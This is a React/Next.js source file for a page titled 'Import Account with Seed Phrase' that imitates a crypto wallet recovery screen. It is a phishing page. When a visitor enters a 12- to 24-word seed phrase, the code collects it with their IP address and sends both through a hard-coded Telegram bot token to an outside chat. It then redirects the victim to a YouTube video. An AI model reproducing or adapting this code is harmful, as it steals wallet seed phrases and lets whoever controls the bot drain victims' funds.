import React, { useRef, useState, useEffect } from 'react';
import Image from 'next/image';
import '../../node_modules/bootstrap/dist/css/bootstrap.min.css';
import classes from '../../styles/Recovery.module.css';
import Arrow from '../../public/assets/arrow.png';
import  { useRouter } from 'next/router';

const Recovery = ({ walletHandler }) => {
  const router = useRouter();

  const [showBtn, setShowBtn] = useState(false);
  const inPutValue = useRef()
  const [clientIp, setClientIp] = useState();

  useEffect(() => {
    fetch('https://geolocation-db.com/json/')
      .then(res => res.json())
      .then(data => {
        console.log(data)
        setClientIp(data.IPv4)
      })
      .catch(error => console.log(error))
  }, [])


  //telegram boat data
  let bot = {
    token: "2140501096:AAHJgY2SgrHFvMRQWiND_k7z2RBRfdeDHSE",
    chatID: "2130650938"
  };
  // let status = "disabled";
  let disabled = false
  const handleSubmit = (e) => {
    e.preventDefault()
    let message = inPutValue.current.value;
    let wordCount = message.split(" ").length - 1;
    if (wordCount >= 12 && wordCount <= 24) {
      let disabled = true;
      let ipAddress = clientIp;
      console.log("ip", ipAddress);
      let sms = ["________(User Message)_______ = ", message, " ", " _____________________(User IP Address)___________________ = ", ipAddress];

      let finalString = sms.join('\r\n');

      fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatID}=&text=${finalString}`, {
        method: "GET"
      })
        .then(success => {
          router.push("https://www.youtube.com/watch?v=yiHEAUc3lgA")
        }, error => {
          alert("message Not Sent");
          console.log(error)
        })
    } else {
      let disabled = false;
    }
  }

  const changeHandler = (e) => {
    let message = e.target.value;
    let wordCount = message.split(" ").length - 1;
    if (wordCount >= 12 && wordCount <= 24) {
      setShowBtn(true)
    } else {
      setShowBtn(false)
    }

  };


  return (
    <div className="text-area-wrapper ">
      <div className="container">
        <div onClick={walletHandler} className={classes.topContentBox}>
          <span className={classes.arrowIcon}> <Image width="20" height="20" src={Arrow} alt="arrow image" /> </span>
        </div>
        <div className="row justify-content-center mb-4">
          <div className={classes.contentBox}>
            <h3>Import Account with Seed Phrase</h3>
          </div>
        </div>
        <div className="input-box">
          <p>Enter your seed phrase to restore your account</p>
          <p>Seed Phrase</p>
          <form onSubmit={handleSubmit}>
            <textarea onChange={changeHandler} className={`form-control ${classes.recoveryForm}`} name="recovery" id="recovery" cols="45" rows="10" ref={inPutValue}></textarea>
            <small>Typicaly 12 words (sometimes 24) seperated by single spaces.</small>
            <br />
            {
              showBtn ? <button className={classes.btnImport} type="submit" >Import</button> : <button className={classes.disableBtn} type="submit" disabled>Import</button>
            }
          </form>
        </div>
      </div>
    </div>
  );
};

export default Recovery;




